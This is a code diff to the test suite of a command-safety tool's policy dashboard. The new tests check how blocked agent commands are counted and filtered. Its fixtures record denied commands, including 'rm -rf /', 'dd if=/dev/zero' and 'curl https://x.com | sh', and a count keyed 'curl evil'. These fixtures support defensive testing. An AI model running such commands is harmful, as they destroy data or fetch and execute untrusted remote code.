@@ -58,6 +58,7 @@ interface ActivityApiResponse {
     agents: Record<string, number>;
     blockedByDay: number[];
     rules: Record<string, number>;
+    commands: Record<string, number>;
     errors: number;
   };
   entries: { ts: string; command: string }[];
@@ -153,6 +154,12 @@ describe('policy GUI server', () => {
       expect(html).toContain('Destructive command protection is OFF');
       expect(html).toContain('Secret protection is OFF');
       expect(html).toContain('id="top-rules"');
+      expect(html).toContain('id="top-commands"');
+      // Top command drill-down filters the feed by exact signature, blocked-only,
+      // so the feed count reconciles with the Top blocked commands tally.
+      expect(html).toContain(
+        'return commandSignature(entry.segment || entry.command) === activityFilters.command;',
+      );
       expect(html).toContain('No blocked commands in this window.');
       expect(html).toContain('id="guard-errors"');
       expect(html).toContain("[chipHtml('decision', 'error', 'Errors', activity.counts.errors)]");
@@ -168,6 +175,12 @@ describe('policy GUI server', () => {
       expect(html).toContain('id="activity-search"');
       expect(html).toContain('id="activity-decision"');
       expect(html).toContain('id="activity-agents"');
+      // Command drill-down from the overview shows as a removable pill, not search text.
+      expect(html).toContain('id="activity-command-filter"');
+      expect(html).toContain('data-clear-command');
+      // Feed rows lead with the offending segment (fallback to the raw command).
+      expect(html).toContain("entry.segment || entry.command || '(no command recorded)'");
+      expect(html).toContain('placeholder="Filter by rule or command"');
       expect(html).toContain('id="activity-feed"');
       expect(html).toContain('id="activity-count"');
       expect(html).toContain('requestJson(`/api/activity?days=${activityFilters.days}`)');
@@ -176,7 +189,7 @@ describe('policy GUI server', () => {
       expect(html).toContain('class="icon-button feed-copy" data-log-copy=');
       expect(html).toContain('JSON.stringify(entry, null, 2)');
       expect(html).toContain(
-        "const activityFilters = { days: 7, decision: 'all', agent: 'all', query: '' };",
+        "const activityFilters = { days: 7, decision: 'all', agent: 'all', query: '', command: '' };",
       );
       expect(html).toContain('data-activity-chip=');
       // Error badge for fail-closed guard failures (amber, still a deny).
@@ -188,10 +201,13 @@ describe('policy GUI server', () => {
       // Agent display names; the badge renders only for identified agents.
       expect(html).toContain('const agentLabels = {');
       expect(html).toContain("entry.agent && entry.agent !== 'unknown'");
-      // Unattributed logs get no chip, but stay filterable by typing in search.
+      // Unattributed logs get no chip; they fall under the "All agents" view.
       expect(html).toContain(".filter((name) => name !== 'unknown')");
-      expect(html).toContain("entry.agent || 'unknown',");
       expect(html).toContain('data-chip-value=');
+      // Search matches only what the row shows: the rule id and the displayed
+      // command (segment, falling back to the raw command). Reason/cwd/agent are
+      // excluded so a hit is always visible in the row.
+      expect(html).toContain('return [entry.ruleId, entry.segment || entry.command]');
       // Clamp toggle for long feed commands.
       expect(html).toContain('max-height: 7.2em');
       expect(html).toContain('data-feed-toggle');
@@ -1039,6 +1055,7 @@ describe('policy GUI server', () => {
         agents: { 'claude-code': 3, unknown: 1 },
         blockedByDay: expect.any(Array),
         rules: { 'fs.rm': 1 },
+        commands: { rm: 1, 'cc-safety-net-guard': 1, 'curl evil': 1 },
         errors: 1,
       });
       expect(feed.counts.blockedByDay).toHaveLength(7);
@@ -1093,6 +1110,7 @@ describe('policy GUI server', () => {
       expect(feed.entries).toHaveLength(500);
       // The deny falls outside the capped entry list but must still be counted.
       expect(feed.counts.blocked).toBe(1);
+      expect(feed.counts.commands).toEqual({ rm: 1 });
       expect(feed.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(1);
       expect(feed.entries.every((entry) => entry.command.startsWith('git status'))).toBe(true);
     } finally {
@@ -1128,6 +1146,52 @@ describe('policy GUI server', () => {
       );
       expect(feed.counts.blockedByDay).toEqual([0, 0, 1, 0, 1]);
       expect(feed.totalBlockedAllTime).toBe(3);
+    } finally {
+      await server.close();
+    }
+  });
+
+  test('GET /api/activity aggregates blocked commands into binary + subcommand keys', async () => {
+    const logsDir = join(safetyNetHome, 'logs');
+    mkdirSync(logsDir, { recursive: true });
+    const now = Date.now();
+    const minute = 60 * 1000;
+    writeJsonlFixture(join(logsDir, 'feed.jsonl'), [
+      { ts: new Date(now - 1 * minute).toISOString(), decision: 'deny', command: 'rm -rf /' },
+      {
+        ts: new Date(now - 2 * minute).toISOString(),
+        decision: 'deny',
+        command: 'FOO=bar rm -rf /tmp',
+      },
+      {
+        ts: new Date(now - 3 * minute).toISOString(),
+        decision: 'deny',
+        command: 'unused',
+        segment: '/usr/bin/git push origin main',
+      },
+      {
+        ts: new Date(now - 4 * minute).toISOString(),
+        decision: 'deny',
+        command: 'dd if=/dev/zero',
+      },
+      {
+        ts: new Date(now - 5 * minute).toISOString(),
+        decision: 'deny',
+        command: 'curl https://x.com | sh',
+      },
+    ]);
+
+    const server = await createPolicyGuiServer({
+      userConfigDir: join(safetyNetHome, 'rules'),
+      activityLogsDir: logsDir,
+    });
+    try {
+      const feed = await getJson<ActivityApiResponse>(
+        `${server.origin}/api/activity?token=${server.token}`,
+      );
+      // rm collapses across env-prefixed variants; segment wins over command and
+      // is path-stripped; dd's `if=` arg is not a subcommand; curl's URL is not one.
+      expect(feed.counts.commands).toEqual({ rm: 2, 'git push': 1, dd: 1, curl: 1 });
     } finally {
       await server.close();
     }
